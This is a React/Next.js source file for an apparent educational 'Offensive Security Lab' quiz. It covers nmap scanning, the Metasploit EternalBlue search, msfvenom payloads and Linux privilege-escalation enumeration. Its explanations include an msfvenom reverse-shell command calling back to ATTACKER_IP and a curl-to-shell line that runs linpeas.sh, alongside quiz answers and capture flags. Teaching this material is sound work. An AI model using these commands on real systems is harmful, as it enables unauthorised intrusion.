'use client'
import React from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'

const accent = '#bf5fff'

const steps: LabStep[] = [
  {
    id: 'offensive-01',
    title: 'Port Scanning with Nmap',
    objective: 'Discover open ports on a target. What nmap flag performs a SYN (stealth) scan?',
    hint: 'SYN scan is the default when run as root. The explicit flag is -sS.',
    answers: ['-sS', 'nmap -sS', '-sS target', 'syn scan'],
    xp: 20,
    explanation: 'nmap -sS sends TCP SYN packets and records responses without completing the 3-way handshake. It\'s faster and less likely to be logged than a full connect scan (-sT). Requires root/admin privileges.'
  },
  {
    id: 'offensive-02',
    title: 'Service Version Detection',
    objective: 'Identify software versions running on open ports. What nmap flag enables version detection?',
    hint: 'The flag is -sV — "s" for scan, "V" for version.',
    answers: ['-sV', 'nmap -sV', '-sV --version-intensity'],
    xp: 20,
    explanation: 'nmap -sV probes open ports to identify the running service and version. Combined with -sC (default scripts): nmap -sC -sV -oA scan target — saves output in all formats. Version info is critical for matching CVEs.'
  },
  {
    id: 'offensive-03',
    title: 'Metasploit Module Search',
    objective: 'In Metasploit, search for EternalBlue exploit modules. What msfconsole command searches for modules?',
    hint: 'The command is simply "search" followed by your search term.',
    answers: ['search eternalblue', 'search ms17-010', 'search smb', 'search'],
    xp: 25,
    explanation: 'In msfconsole: "search eternalblue" returns exploit/windows/smb/ms17_010_eternalblue. Then "use 0" to select, "options" to see required fields, "set RHOSTS target_ip", "run". Always verify you have authorization before using exploits.'
  },
  {
    id: 'offensive-04',
    title: 'Reverse Shell Payload',
    objective: 'Generate a Windows reverse shell with msfvenom. What payload string creates a Windows x64 reverse TCP Meterpreter shell?',
    hint: 'Format: windows/x64/meterpreter/reverse_tcp',
    answers: ['windows/x64/meterpreter/reverse_tcp', 'windows/meterpreter/reverse_tcp', 'meterpreter/reverse_tcp'],
    flag: 'FLAG{payload_generated}',
    xp: 35,
    explanation: 'Full command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe\nThe staged payload (/) contacts your listener to download the second stage. Use multi/handler in Metasploit to catch the connection.'
  },
  {
    id: 'offensive-05',
    title: 'Privilege Escalation Check',
    objective: 'After gaining initial access on Linux, what tool automatically enumerates privilege escalation vectors?',
    hint: 'A popular shell script: linPEAS or LinEnum. Both are valid.',
    answers: ['linpeas', 'linenum', 'linpeas.sh', 'linux-exploit-suggester', 'les'],
    flag: 'FLAG{privesc_enumerated}',
    xp: 30,
    explanation: 'LinPEAS (Linux Privilege Escalation Awesome Script) checks SUID/GUID binaries, sudo rules, cron jobs, world-writable files, kernel version, and hundreds more vectors. Run: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
  }
]

export default function OffensiveLab() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a2a7a' }}>
        <Link href="/" style={{ color: '#5a2a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/offensive" style={{ color: '#5a2a7a', textDecoration: 'none' }}>OFFENSIVE SECURITY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
      </div>

      <div style={{ marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a2a7a', letterSpacing: '0.2em', marginBottom: '0.5rem' }}>MOD-04 &#8250; INTERACTIVE LAB</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.6rem', fontWeight: 700, color: accent, margin: 0 }}>Offensive Security Lab</h1>
        <p style={{ color: '#7a6a8a', fontSize: '0.85rem', marginTop: '0.75rem', lineHeight: 1.7 }}>
          Nmap scanning, Metasploit framework, payload generation, and privilege escalation enumeration.
          Complete all 5 steps to earn 130 XP.
        </p>
        <div style={{ marginTop: '1rem', background: 'rgba(0,0,0,0.3)', border: '1px solid #bf5fff22', borderRadius: '6px', padding: '1rem 1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a8a5a', lineHeight: 1.8 }}>
          <span style={{ color: accent, fontWeight: 600 }}>HOW TO USE THIS LAB:</span> Read each step objective, type the command or answer in the terminal below, and press Enter. Type <span style={{ color: '#ffb347' }}>hint</span> if you get stuck. Earn XP and capture flags on key steps. Progress saves automatically.
        </div>
      </div>

      <LabTerminal
        labId="offensive-lab"
        moduleId="offensive"
        title="Offensive Security Lab"
        accent={accent}
        steps={steps}
      />
    </div>
  )
}
